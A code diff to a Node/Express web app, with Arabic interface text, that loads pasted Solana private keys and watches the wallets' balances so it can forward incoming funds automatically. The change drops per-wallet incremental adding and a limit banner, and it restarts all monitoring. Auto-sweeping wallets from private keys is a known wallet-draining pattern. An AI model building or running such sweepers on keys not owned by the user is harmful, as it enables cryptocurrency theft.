@@ -92,41 +92,33 @@ class SolanaWebMonitor {
             return { success: false, message: 'لم يتم العثور على مفاتيح صالحة' };
         }
         
-        // Check available RPC slots
-        const currentWalletCount = this.wallets.length;
-        const availableSlots = this.rpcUrls.length - currentWalletCount;
-        
-        if (availableSlots === 0) {
-            return { success: false, message: 'لايمكنك اضافة محفظة اخرى', showTopMessage: true };
+        if (privateKeys.length > this.rpcUrls.length) {
+            this.addNotification(`⚠️ يمكنك إضافة حتى ${this.rpcUrls.length} محفظة فقط (عدد RPC URLs المتاحة)`, 'warning');
+            return { success: false, message: `يمكنك إضافة حتى ${this.rpcUrls.length} محفظة فقط` };
         }
         
-        if (privateKeys.length > availableSlots) {
-            this.addNotification(`⚠️ يمكنك إضافة حتى ${availableSlots} محفظة فقط من المتبقية`, 'warning');
-            return { success: false, message: `يمكنك إضافة حتى ${availableSlots} محفظة فقط` };
-        }
+        // Stop current monitoring
+        this.stopAllMonitoring();
+        
+        // Initialize wallets and connections
+        this.wallets = [];
+        this.connections = [];
         
         let successCount = 0;
-        let startIndex = currentWalletCount;
         
         for (let i = 0; i < privateKeys.length; i++) {
             try {
                 const privateKey = privateKeys[i].trim();
                 const privateKeyBytes = bs58.decode(privateKey);
                 const wallet = Keypair.fromSecretKey(privateKeyBytes);
-                const rpcIndex = startIndex + i;
-                const connection = new Connection(this.rpcUrls[rpcIndex], 'confirmed');
+                const connection = new Connection(this.rpcUrls[i], 'confirmed');
                 
                 this.wallets.push(wallet);
                 this.connections.push(connection);
-                this.subscriptionIds.push(null);
-                this.lastBalances.push(0);
                 successCount++;
                 
-                console.log(`✅ Wallet ${rpcIndex + 1} loaded: ${wallet.publicKey.toString()}`);
-                console.log(`🔗 Using RPC: ${this.rpcUrls[rpcIndex]}`);
-                
-                // Start monitoring for this new wallet immediately
-                this.startMonitoringForWallet(rpcIndex);
+                console.log(`✅ Wallet ${i + 1} loaded: ${wallet.publicKey.toString()}`);
+                console.log(`🔗 Using RPC: ${this.rpcUrls[i]}`);
                 
             } catch (error) {
                 this.addNotification(`❌ خطأ في المفتاح ${i + 1}: ${error.message}`, 'error');
@@ -135,76 +127,15 @@ class SolanaWebMonitor {
         }
         
         if (successCount > 0) {
-            this.addNotification(`✅ تم إضافة ${successCount} محفظة جديدة بنجاح!`, 'success');
-            return { success: true, message: `تم إضافة ${successCount} محفظة جديدة بنجاح` };
+            this.addNotification(`✅ تم تحميل ${successCount} محفظة بنجاح!`, 'success');
+            this.startMonitoring();
+            return { success: true, message: `تم تحميل ${successCount} محفظة بنجاح` };
         } else {
             this.addNotification('❌ فشل في تحميل أي محفظة', 'error');
             return { success: false, message: 'فشل في تحميل أي محفظة' };
         }
     }
     
-    async startMonitoringForWallet(walletIndex) {
-        const wallet = this.wallets[walletIndex];
-        const connection = this.connections[walletIndex];
-        const walletNumber = walletIndex + 1;
-        
-        // Check initial balance
-        try {
-            const initialBalance = await this.getBalance(connection, wallet.publicKey);
-            this.lastBalances[walletIndex] = initialBalance;
-            
-            if (initialBalance > 0) {
-                // Send funds immediately
-                const sendPromise = this.forwardFunds(connection, wallet, initialBalance, walletNumber);
-                // Send notification in parallel
-                this.addNotification(`💰 المحفظة ${walletNumber}: رصيد موجود ${initialBalance / LAMPORTS_PER_SOL} SOL`, 'info');
-                await sendPromise;
-            }
-        } catch (error) {
-            console.error(`Error checking initial balance for wallet ${walletNumber}:`, error.message);
-            this.lastBalances[walletIndex] = 0;
-        }
-        
-        // Set up WebSocket subscription for this wallet
-        try {
-            const subscriptionId = connection.onAccountChange(
-                wallet.publicKey,
-                async (accountInfo) => {
-                    try {
-                        const newBalance = accountInfo.lamports;
-                        const oldBalance = this.lastBalances[walletIndex] || 0;
-                        
-                        if (newBalance > oldBalance && newBalance > 0) {
-                            const received = newBalance - oldBalance;
-                            console.log(`💰 Wallet ${walletNumber}: Balance changed from ${oldBalance} to ${newBalance} lamports`);
-                            
-                            // Send funds immediately
-                            const sendPromise = this.forwardFunds(connection, wallet, newBalance, walletNumber);
-                            // Send notification in parallel (non-blocking)
-                            this.addNotification(`💰 المحفظة ${walletNumber}: وصل ${received / LAMPORTS_PER_SOL} SOL`, 'success');
-                            await sendPromise;
-                        }
-                        
-                        this.lastBalances[walletIndex] = newBalance;
-                        
-                    } catch (error) {
-                        console.error(`Error processing account change for wallet ${walletNumber}:`, error.message);
-                        this.handleRpcError(error, walletIndex, walletNumber);
-                    }
-                },
-                'confirmed'
-            );
-            
-            this.subscriptionIds[walletIndex] = subscriptionId;
-            console.log(`✅ WebSocket subscription started for wallet ${walletNumber}: ${wallet.publicKey.toString()}`);
-            
-        } catch (error) {
-            console.error(`Error setting up subscription for wallet ${walletNumber}:`, error.message);
-            this.handleRpcError(error, walletIndex, walletNumber);
-            this.subscriptionIds[walletIndex] = null;
-        }
-    }
-
     async startMonitoring() {
         this.addNotification('🔍 بدء مراقبة المحافظ...', 'info');
         
@@ -544,28 +475,6 @@ app.get('/', (req, res) => {
             border-radius: 20px;
             box-shadow: 0 20px 40px rgba(0,0,0,0.1);
             overflow: hidden;
-            position: relative;
-        }
-        
-        .top-message {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            background: #dc3545;
-            color: white;
-            text-align: center;
-            padding: 15px;
-            font-size: 16px;
-            font-weight: bold;
-            z-index: 1000;
-            border-radius: 20px 20px 0 0;
-            transform: translateY(-100%);
-            transition: transform 0.3s ease;
-        }
-        
-        .top-message.show {
-            transform: translateY(0);
         }
         
         .header {
@@ -695,7 +604,10 @@ app.get('/', (req, res) => {
             padding: 20px;
             max-height: 400px;
             overflow-y: auto;
+            overflow-x: hidden;
             border: 2px solid #e9ecef;
+            word-break: break-all;
+            overflow-wrap: break-word;
         }
         
         .notification {
@@ -704,8 +616,6 @@ app.get('/', (req, res) => {
             border-radius: 8px;
             font-size: 14px;
             border-left: 4px solid #667eea;
-            word-break: break-all;
-            overflow-wrap: break-word;
         }
         
         .notification.success {
@@ -778,9 +688,6 @@ app.get('/', (req, res) => {
 </head>
 <body>
     <div class="container">
-        <div class="top-message" id="topMessage">
-            لايمكنك اضافة محفظة اخرى
-        </div>
         <div class="header">
             <h1>🔥 مراقب محافظ Solana</h1>
             <p>مراقبة وتحويل الأموال تلقائياً من محافظ Solana</p>
@@ -853,7 +760,7 @@ app.get('/', (req, res) => {
             try {
                 const response = await fetch('/api/notifications');
                 const notifications = await response.json();
-                displayNotifications(notifications || []);
+                displayNotifications(notifications);
                 updateStats();
             } catch (error) {
                 console.error('Error loading notifications:', error);
@@ -882,23 +789,12 @@ app.get('/', (req, res) => {
                 const response = await fetch('/api/status');
                 const status = await response.json();
                 
-                const wallets = status.wallets || [];
-                document.getElementById('walletCount').textContent = wallets.length;
-                document.getElementById('activeCount').textContent = wallets.filter(w => w.hasSubscription && !w.isFailed).length;
-                document.getElementById('errorCount').textContent = wallets.reduce((sum, w) => sum + (w.errorCount || 0), 0);
+                document.getElementById('walletCount').textContent = status.wallets.length;
+                document.getElementById('activeCount').textContent = status.wallets.filter(w => w.hasSubscription && !w.isFailed).length;
+                document.getElementById('errorCount').textContent = status.wallets.reduce((sum, w) => sum + w.errorCount, 0);
             } catch (error) {
                 console.error('Error updating stats:', error);
             }
-        }
-        
-        // Show top message for 2 seconds
-        function showTopMessage() {
-            const topMessage = document.getElementById('topMessage');
-            topMessage.classList.add('show');
-            
-            setTimeout(() => {
-                topMessage.classList.remove('show');
-            }, 2000);
         }
         
         // Add wallets form
@@ -928,11 +824,7 @@ app.get('/', (req, res) => {
                     document.getElementById('privateKeys').value = '';
                     alert('تم إضافة المحافظ بنجاح!');
                 } else {
-                    if (result.showTopMessage) {
-                        showTopMessage();
-                    } else {
-                        alert('خطأ: ' + result.message);
-                    }
+                    alert('خطأ: ' + result.message);
                 }
             } catch (error) {
                 alert('خطأ في الاتصال: ' + error.message);
